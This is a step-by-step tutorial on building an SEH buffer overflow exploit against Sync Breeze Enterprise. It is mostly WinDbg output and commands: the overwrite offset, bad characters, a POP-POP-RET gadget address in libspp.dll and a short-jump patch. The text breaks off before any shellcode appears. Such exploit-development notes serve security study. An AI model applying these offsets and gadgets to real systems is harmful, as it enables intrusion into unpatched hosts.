# Our first SEH overflow exploit, step by step
Let's start supposing that we already know that our input buffer crashes the program and somehow reaches any of the `_EXCEPTION_REGISTRATION_RECORD` structures.
Let's create a pattern in KALI to see the length of our buffer until it reaches the structure:
```bash
msf-pattern_create -l 1000              
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

Let's paste this pattern and send this next to the headers needed so our payload is processed. Sending only this payload is useless as we want the program to process the input.
With 1000 characters, the program crashes:
```c
(1794.19f0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
eax=63413163 ebx=00affa0c ecx=00afff08 edx=00aff9c4 esi=00afff08 edi=00affb10
eip=00932a9d esp=00aff998 ebp=00affeb8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00932a9d ff5024          call    dword ptr [eax+24h]  ds:0023:63413187=????????
```

We need to see at what address does our `EXCEPTION_REGISTRATION_RECORD` structures point to.
Let's list the exception chains:
```c
0:009> !exchain
00affe0c: libpal!md5_starts+149fb (009adf5b)
00afff44: 33654132
Invalid exception stack at 65413165
0:009> !teb
TEB at 00366000
    ExceptionList:        00affe0c
    StackBase:            00b00000
    StackLimit:           00aff000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00366000
    EnvironmentPointer:   00000000
    ClientId:             00001794 . 000019f0
    RpcHandle:            00000000
    Tls Storage:          00587898
    PEB Address:          00354000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
0:009> dt _EXCEPTION_REGISTRATION_RECORD 00affe0c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x00afff44 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x009adf5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0
0:009> dt _EXCEPTION_REGISTRATION_RECORD 00afff44
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x65413165 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x33654132     _EXCEPTION_DISPOSITION  +33654132
```

We can see that the second record generated an error:
- The "Next" pointer points to an invalid address (65413165), which gives an invalid exception stack error.
- The Handler is also overwritten as it is placed after the "Next" parameter in the stack.
Let's verify that both values have been overwritten with our buffer:
```bash
msf-pattern_offset -l 1000 -q 33654132 
[*] Exact match at offset 128
                                                                                                                                                     
msf-pattern_offset -l 1000 -q 0x65413165 
[*] Exact match at offset 124
```

We can see that we managed to overwrite both values.
So our payload is 128 bytes (in order to overwrite both values).
Let's put 124 "A", 4 "B" (which will overwrite the Next value) and another 4 "C" (which will overwrite the Handler value).
```c
0:009> !teb
TEB at 00382000
    ExceptionList:        0185fe14
    StackBase:            01860000
    StackLimit:           0185f000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00382000
    EnvironmentPointer:   00000000
    ClientId:             00001b28 . 00000828
    RpcHandle:            00000000
    Tls Storage:          005fa6d8
    PEB Address:          00376000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
0:009> dt _EXCEPTION_REGISTRATION_RECORD 0185fe14
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0185ff44 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x0096dce3     _EXCEPTION_DISPOSITION  libpal!md5_starts+0
0:009> dt _EXCEPTION_REGISTRATION_RECORD 0185ff44 
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x42424242 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x43434343     _EXCEPTION_DISPOSITION  +43434343
```

As we can see, we managed to overwrite both values.
We want to overwrite only the "Handler" value so we will add 128 bytes (the next 4 will overwrite the handle address).

Let's continue by deleting the bad characters.
Update the payload to add the badchars after the 128 bytes.
Also, let's add more bytes so the overflow is triggered (**At this point I don't know why, but, when adding the badchars after the 128 bytes that previously crashed the binary, it does not crash anymore. I guess it's because of the badchars. We have to add more bytes AFTER the badchars so it crashes and we can inspect badchars**)
Once we have updated the payload, we have to inspect the part of the stack where our payload is stored.
If we remember, the same location where the `EXCEPTION_REGISTRATION_RECORD` pointed to is where the payload is stored. Let's check:
```c
0:008> !teb
TEB at 00224000
    ExceptionList:        0171fe0c
    StackBase:            01720000
    StackLimit:           0171f000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00224000
    EnvironmentPointer:   00000000
    ClientId:             00000630 . 00000ce4
    RpcHandle:            00000000
    Tls Storage:          00629628
    PEB Address:          00219000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
0:008> dt _EXCEPTION_REGISTRATION_RECORD 0171fe0c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0171ff44 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x0089df5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0
```
Let's access the address of such record which is fully overwritten:
```c
0:008> dds 0x0171ff44 
0171ff44  41414141
0171ff48  42424242
0171ff4c  00000001
0171ff50  008507ec libpal!SCA_TcpServer::CommandCallback+0xdc
0171ff54  00853e10 libpal!SCA_WinFile::operator=+0xe50
```
After the payload we se a "0000001" value, let's inspect what happened:
```c
0:008> db 0x0171ff44 
0171ff44  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 85 00  AAAABBBB........
0171ff54  10 3e 85 00 f8 5f df 00-72 40 85 00 c0 ed bc 00  .>..._..r@......
0171ff64  f8 5f df 00 24 3e 85 00-c0 ed bc 00 10 3e 85 00  ._..$>.......>..
0171ff74  29 d8 07 76 f8 5f df 00-10 d8 07 76 dc ff 71 01  )..v._.....v..q.
0171ff84  4d 25 05 77 f8 5f df 00-dc df 5e e0 00 00 00 00  M%.w._....^.....
0171ff94  00 00 00 00 f8 5f df 00-00 00 00 00 00 00 00 00  ....._..........
0171ffa4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0171ffb4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```
We can see that the payload is truncated after the "01" byte, which means that the "02" byte is a badchar.
Repeating this process leads us to the following badchars: 0x00, 0x02, 0x0A, 0x0D, 0xF8, 0xFD.
For example, here I attach how I detected that 0x0A is also a badchar:
```c
0:008> !teb
TEB at 003cb000
    ExceptionList:        0174fe0c
    StackBase:            01750000
    StackLimit:           0174f000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 003cb000
    EnvironmentPointer:   00000000
    ClientId:             00001260 . 000018d0
    RpcHandle:            00000000
    Tls Storage:          0052a988
    PEB Address:          003c0000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
0:008> dt _EXCEPTION_REGISTRATION_RECORD 0174fe0c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x0174ff44 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x0096df5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0
0:008> dd 0x0174ff44 L8
0174ff44  41414141 42424242 05040301 09080706
0174ff54  00923e00 00e25e18 00924072 00bfedc0
0:008> dds 0x0174ff44 L8
0174ff44  41414141
0174ff48  42424242
0174ff4c  05040301
0174ff50  09080706
0174ff54  00923e00 libpal!SCA_WinFile::operator=+0xe40
0174ff58  00e25e18
0174ff5c  00924072 libpal!SCA_WinFile::operator=+0x10b2
0174ff60  00bfedc0
0:008> db 0174ff4c  
0174ff4c  01 03 04 05 06 07 08 09-00 3e 92 00 18 5e e2 00  .........>...^..
0174ff5c  72 40 92 00 c0 ed bf 00-18 5e e2 00 24 3e 92 00  r@.......^..$>..
0174ff6c  c0 ed bf 00 10 3e 92 00-29 d8 07 76 18 5e e2 00  .....>..)..v.^..
0174ff7c  10 d8 07 76 dc ff 74 01-4d 25 05 77 18 5e e2 00  ...v..t.M%.w.^..
0174ff8c  24 19 dc 0e 00 00 00 00-00 00 00 00 18 5e e2 00  $............^..
0174ff9c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0174ffac  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0174ffbc  00 00 00 00 00 00 00 00-8c ff 74 01 00 00 00 00  ..........t.....
```
After 09, the next byte should be 0A, but it's 00.

Now let's find a module of the application that have addresses without badchars and also that has SafeSEH off. The idea is to bypass SafeSEH by exploiting a module that does not implement SafeSEH, leveraging the POP R32, POP R32, RET instruction sequence from a module that was compiled without the /SAFESEH.

**Note: in order for this exploit to be portable against multiple Windows OS, we have to locate a POP, POP, RET instruction sequence inside a module that is part of the vulnerable software.** 

Let's find the modules with the WinDbg *narly* extension. Let's load it and list the modules:

```c
0:008> .load narly

      __s|I}*!{a.                        ._s,aan2*a
     _wY1+~-    )S,                     .ae"~=:...:X
   .vXl+:.       -4c                   <2+=|==::..:d
   vvi=;..        -?o,                =2=+==:::...=d
  )nv=:.            )5,              .2=--.......-=d
  ue+::              -*s             <c .        .=d
  m>==::..     ._,     <s,           )c           :d
  #==viii|===; {Xs=,    -{s          )c         ..:d
  Z;{nnonnvvii;v(-{%=.    ~s,        )e:====||iiv%=d
  X={oooonvvIl;3;  -{%,    -*>       )2<onnnnvnnnn>d
  X=)vvvvIliii:3;    -!s.   :)s.     )e<oonvlllllIid
  X=<lllliii|=:n;      -1c.  +|1,    )z<nvii||+|+|vX
  S=<lli|||=:: n;        "nc  -s%;   )c=ovl|++==+=vo
  X=<i||+=; . .n`          "1>.-{%i. )c<Xnnli||++=vn
  X=iii>==-.  :o`            "1,:+iI,)c:Sonnvli||=v(
  X>{ii+;:-  .u(               "o,-{Iw(:nvvvllii=v2
  S=i||;:. .=u(                 -!o,+I(:iiillii|ie`
  2>v|==__su?`                    -?o,-:==||iisv"
  {nvnI!""~                         -!sasvv}""`

             by Nephi Johnson (d0c_s4vage)
                      N for gnarly!

Available commands:

    !nmod     - display /SafeSEH, /GS, DEP, and ASLR info for
                all loaded modules

0:008> !nmod
00400000 00463000 syncbrs              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe
00850000 00905000 libsync              /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libsync.dll
00910000 009e4000 libpal               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libpal.dll
10000000 10226000 libspp               /SafeSEH OFF                C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll
69240000 69250000 wshbth               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\wshbth.dll
69280000 69296000 pnrpnsp              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\pnrpnsp.dll
692e0000 692f1000 napinsp              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\napinsp.dll
69880000 6988e000 winrnr               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\winrnr.dll
6a530000 6a5cf000 ODBC32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ODBC32.dll
6ab10000 6ab38000 WINMM                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\WINMM.dll
6ac30000 6ac44000 NETAPI32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\NETAPI32.dll
6acd0000 6ace9000 MPR                  /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\MPR.dll
6dbe0000 6dbfd000 SRVCLI               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\SRVCLI.DLL
72780000 72796000 NLAapi               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\NLAapi.dll
73610000 73c28000 windows_storage      /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\windows.storage.dll
74300000 74311000 WKSCLI               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\WKSCLI.DLL
74520000 74552000 IPHLPAPI             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\IPHLPAPI.DLL
74560000 745f0000 DNSAPI               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\DNSAPI.dll
745f0000 745fb000 NETUTILS             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\NETUTILS.DLL
74790000 747e7000 mswsock              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\mswsock.dll
749d0000 749f5000 Wldp                 /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\Wldp.dll
74cb0000 74cb8000 DPAPI                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\DPAPI.DLL
74e00000 74e25000 SspiCli              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\SspiCli.dll
74f10000 7514e000 KERNELBASE           /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNELBASE.dll
75150000 75236000 gdi32full            /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\gdi32full.dll
75240000 7525b000 bcrypt               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\bcrypt.dll
75260000 7535e000 CRYPT32              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\CRYPT32.dll
75450000 7546d000 win32u               NO_SEH       /GS *ASLR *DEP C:\Windows\System32\win32u.dll
75470000 754eb000 msvcp_win            /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\msvcp_win.dll
75540000 7557b000 cfgmgr32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\cfgmgr32.dll
75580000 756a0000 ucrtbase             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\ucrtbase.dll
75700000 757e3000 ole32                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\ole32.dll
75940000 75bc1000 combase              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\combase.dll
75bd0000 7600b000 SETUPAPI             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\SETUPAPI.dll
76010000 76055000 SHLWAPI              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\SHLWAPI.dll
76060000 760fd000 KERNEL32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\KERNEL32.DLL
76100000 76187000 SHCORE               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\SHCORE.dll
76190000 76226000 OLEAUT32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\OLEAUT32.dll
76230000 762f3000 RPCRT4               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\RPCRT4.dll
763e0000 763e7000 NSI                  NO_SEH       /GS *ASLR *DEP C:\Windows\System32\NSI.dll
76560000 76b39000 SHELL32              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\SHELL32.dll
76b40000 76bff000 MSVCRT               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\MSVCRT.dll
76c00000 76c77000 sechost              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\sechost.dll
76c80000 76ce3000 WS2_32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\WS2_32.dll
76cf0000 76d12000 GDI32                NO_SEH       /GS *ASLR *DEP C:\Windows\System32\GDI32.dll
76e20000 76e9d000 ADVAPI32             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\ADVAPI32.dll
76ea0000 76ea6000 PSAPI                NO_SEH       /GS *ASLR *DEP C:\Windows\System32\PSAPI.DLL
76eb0000 77027000 USER32               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\USER32.dll
77030000 771cf000 ntdll                /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ntdll.dll
```

There are several modules. However, the libspp.dll application DLL is a perfect candidate. It is compiled without any protections and is loaded in a memory range which does not contain null bytes.
We will use a WinDBG script to search for a POP32, POP32, RET instruction. We will use a classic WinDbg.
Narly did also give us the memory region of the library.

We want to gather all the possible opcodes of the POP instructions for each available register. We don't want to perform a "pop esp" as this will modify the esp, the stack pointer, and disrupt the stack frame. The rest of the register are fine for us.
let's find all the opcodes:
```bash
msf-nasm_shell 
nasm > pop eax
00000000  58                pop eax
nasm > pop ebx
00000000  5B                pop ebx
nasm > pop ecx
00000000  59                pop ecx
nasm > pop edx
00000000  5A                pop edx
nasm > pop esi
00000000  5E                pop esi
nasm > pop edi
00000000  5F                pop edi
nasm > pop ebp 
00000000  5D                pop ebp
nasm > ret
00000000  C3                ret
nasm > 
```

We can see that all the "pop" instruction start from opcode 58 to 5D. Ret opcode is C3.
With this information, we will execute a WinDBG script that will search **around the base address of the module we want to search for these instructions, and find a pop, pop, ret, instruction**:
```c
.block 
{ 
	.for (r $t0 = 0x58; $t0 < 0x5F; r $t0 = $t0 + 0x01) 
	{ 
		.for (r $t1 = 0x58; $t1 < 0x5F; r $t1 = $t1 + 0x01) 
		{ 
			s-[1]b 10000000 10226000 $t0 $t1 c3 
		} 
	} 
}
```

Let's execute this script in WinDbg: **remember to replace the address range of the module!**
The results are that there are **several chains of these instructions:**
```c
0:009> $><C:\Users\user\Desktop\find_ppr.wds
0x1015a2f0
0x100087dd
0x10008808
0x1000881a
0x10008829
0x1001bb8a
0x1001bc1f
0x100491e4
0x1006ef94
0x1006ef9b
0x1008922a
0x10089280
0x1008971d
0x10089748
0x1008975a
0x10089769
0x10089ddb
0x10089e01
0x1008a717
0x1008a7a3
0x1008b063
0x1008b082
0x1008b0e5
0x1008b0f8
0x1008b9f9
0x1008ba7f
0x1008bb8c
0x1008bb95
0x1009a662
0x1009af98
0x100a4bdb
```

Let's see that, for example, the first one, points to a valid chain, **check that there is no pop esp before using this! And also check that the address does not have badchars!**
```c
0:009> u 0x1015a2f0 L3
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```

Each pop is in a different register, but as we said, it does not mind for now.
So, let's update the exploit so that the SEH handler structure points to this address: 0x1015a2f0
To do this easy, we can use the "pack" library to represent this address in little endian:
```python
inputBuffer+= pack("<L", (0x1015a2f0)) # Overwrite SEH address with pop eax; pop ebx; ret 
```

And if we send the payload and see the handlers, we see that the handler has been modified to the 0x1015a2f0 address. 
```c
0:010> !teb
TEB at 003c6000
    ExceptionList:        008dfe0c
    StackBase:            008e0000
    StackLimit:           008df000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 003c6000
    EnvironmentPointer:   00000000
    ClientId:             0000091c . 0000124c
    RpcHandle:            00000000
    Tls Storage:          00608320
    PEB Address:          003b5000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0
0:010> dt _EXCEPTION_REGISTRATION_RECORD 008dfe0c
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x008dff44 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x0096df5b     _EXCEPTION_DISPOSITION  libpal!md5_starts+0
0:010> dt _EXCEPTION_REGISTRATION_RECORD 0x008dff44 
ntdll!_EXCEPTION_REGISTRATION_RECORD
   +0x000 Next             : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
   +0x004 Handler          : 0x1015a2f0     _EXCEPTION_DISPOSITION  libspp!pcre_exec+0
0:010> u 0x1015a2f0 L3
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
1015a2f1 5b              pop     ebx
1015a2f2 c3              ret
```

Now, let's examine what will happen: There will be an exception, the first handler won't be able to manage it and jump to the second handler, which we have modified. The handler address is at our set of pop, pop, ret instructions, and that should point to our shellcode, which we saw that is stored as the third parameter on the stack.

Let's put a breapoint on our "pop, pop, ret" chain:
```c
0:010> bp 0x1015a2f0
0:010> g
Breakpoint 0 hit
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=770c6270 esi=00000000 edi=00000000
eip=1015a2f0 esp=008df440 ebp=008df460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
0:010> r
eax=00000000 ebx=00000000 ecx=1015a2f0 edx=770c6270 esi=00000000 edi=00000000
eip=1015a2f0 esp=008df440 ebp=008df460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16460:
1015a2f0 58              pop     eax
0:010> t
eax=770c6252 ebx=00000000 ecx=1015a2f0 edx=770c6270 esi=00000000 edi=00000000
eip=1015a2f1 esp=008df444 ebp=008df460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16461:
1015a2f1 5b              pop     ebx
0:010> t
eax=770c6252 ebx=008df540 ecx=1015a2f0 edx=770c6270 esi=00000000 edi=00000000
eip=1015a2f2 esp=008df448 ebp=008df460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16462:
1015a2f2 c3              ret
```

Now the next step will be a "ret", which will return the instruction flow to what the top of the stack has. Let's see the top of the stack:
```c
0:010> dd poi(esp)
008dff44  41414141 1015a2f0 43434343 43434343
008dff54  43434343 43434343 43434343 43434343
008dff64  43434343 43434343 43434343 43434343
008dff74  43434343 43434343 43434343 43434343
008dff84  43434343 43434343 43434343 43434343
008dff94  43434343 43434343 43434343 43434343
008dffa4  43434343 43434343 43434343 43434343
008dffb4  43434343 43434343 43434343 43434343
```

After executing the ret instruction, we will point to 008dff44, which is at the start of the `_EXCEPTION_REGISTRATION_RECORD` structure. That structure had 41414141 as the "Next" member address, and the "Handler" address. The next is our shellcode.

The bad thing is that right now we don't exactly land on our shellcode. 
We land on the following instructions:
- 41 41 41 41 (or whatever we put in our buffer)
- 4 bytes corresponding of the pop, pop, ret address we used
- Our shellcode.

If we analyze the instructions, we see that the "pop, pop, ret" address is malformed and takes 2 more bytes, resulting in another instruction when executed as code instead of an address.
Because this instruction uses part of our buffer as a destination adress, and this address is not mapped, this will trigger an access violation and break our exploit:

```c
0:007> t
eax=771a6252 ebx=0091f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000
eip=0091ff44 esp=0091f44c ebp=0091f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0091ff44 41              inc     ecx
0:007> u eip L8
0091ff44 41              inc     ecx
0091ff45 41              inc     ecx
0091ff46 41              inc     ecx
0091ff47 41              inc     ecx
0091ff48 f0a215104343    lock mov byte ptr ds:[43431015h],al
0091ff4e 43              inc     ebx
0091ff4f 43              inc     ebx
0091ff50 43              inc     ebx
```

But remember we have 4 bytes corresponding to the "Next" parameter that right now are 41 41 41 41. 
We can replace those bytes with an instruction that will jump to our shellcode, skipping the four bytes of the pop, pop, ret memory address which cause problems.
This is known as a "short jump" in assembly, also known as a short relative jump.
The first opcode of the short jump is 0xEB and the second opcode is the offset in bytes.
The offset in bytes is 0x00 to 0x7F for forward short jumps, and 0x80 to 0xFF to backwards short jumps.

Let's see the formula of the short jump:
`JMP Address + 2 + Second_Byte_value = Next_Instruction_Address`

It's basically a JMP (EB) + 2 bytes + the offset in bytes we want to jump.  Here are some examples:

| **Address  Code** | **Instruction** | **Formula Examples**      |
| ----------------- | --------------- | ------------------------- |
| **0100   EB 03**  | **JMP  0105**   | **100h + 2 + 03h = 105h** |
| **0152   EB 23**  | **JMP  0177**   | **152h + 2 + 23h = 177h** |
| **0173   EB 47**  | **JMP  01BC**   | **173h + 2 + 47h = 1BCh** |
| **0200   EB 7F**  | **JMP  0281**   | **200h + 2 + 7Fh = 281h** |

In the previous example, we want to jump to 0091ff4c, which is the start of our shellcode.
```c
0:007> dds eip L4
0091ff44  41414141
0091ff48  1015a2f0 libspp!pcre_exec+0x16460
0091ff4c  43434343
0091ff50  43434343
```
We can replace the instruction in 0091ff44 to a "jmp 0x0091ff4c".
We can do this in WinGdb with the "a" command, replacing the actual EIP for our instruction, like live patching:
```c
0:007> dds eip L4
0091ff44  41414141
0091ff48  1015a2f0 libspp!pcre_exec+0x16460
0091ff4c  43434343
0091ff50  43434343
0:007> a
0091ff44 jmp 0x0091ff4c
jmp 0x0091ff4c
```
Let's inspect how the debugger translated such JMP instruction, and confirm it's a short jump:
```c
0:007> u eip
0091ff44 eb06            jmp     0091ff4c
0091ff46 41              inc     ecx
0091ff47 41              inc     ecx
0091ff48 f0a215104343    lock mov byte ptr ds:[43431015h],al
0091ff4e 43              inc     ebx
0091ff4f 43              inc     ebx
0091ff50 43              inc     ebx
0091ff51 43              inc     ebx

```

It's a EB06, meaning that it jumps 4 bytes offset (remember that was EB + 02 bytes + offset bytes).
Exactly, it's skipping the 4 bytes corresponding to the pop, pop, ret instruction at 0091ff48!
```c
0:007> dds eip L4
0091ff44  414106eb
0091ff48  1015a2f0 libspp!pcre_exec+0x16460
0091ff4c  43434343
0091ff50  43434343
0:007> u eip
0091ff44 eb06            jmp     0091ff4c
0091ff46 41              inc     ecx
0091ff47 41              inc     ecx
0091ff48 f0a215104343    lock mov byte ptr ds:[43431015h],al
0091ff4e 43              inc     ebx
0091ff4f 43              inc     ebx
0091ff50 43              inc     ebx
0091ff51 43              inc     ebx
```

Instead of 41414141, we have to insert eb069090 (2 nops at the end). Remember that we have to insert them in little endian. But as they are nops, we can do 90 90 eb 06, or eb 06 90 90.

Replacing this in our payload leads us to now doing a NOP, NOP, and the relative jump to our code:
```c
0:008> t
eax=771a6252 ebx=0172f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000
eip=1015a2f2 esp=0172f448 ebp=0172f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
libspp!pcre_exec+0x16462:
1015a2f2 c3              ret
0:008> t
eax=771a6252 ebx=0172f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000
eip=0172ff44 esp=0172f44c ebp=0172f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0172ff44 90              nop
0:008> t
eax=771a6252 ebx=0172f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000
eip=0172ff45 esp=0172f44c ebp=0172f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0172ff45 90              nop
0:008> t
eax=771a6252 ebx=0172f540 ecx=1015a2f0 edx=771a6270 esi=00000000 edi=00000000
eip=0172ff46 esp=0172f44c ebp=0172f460 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0172ff46 eb06            jmp     0172ff4e
```

But we don't land on our shellcode directly:
```c
0091ff3f 41              inc     ecx
0091ff40 41              inc     ecx
0091ff41 41              inc     ecx
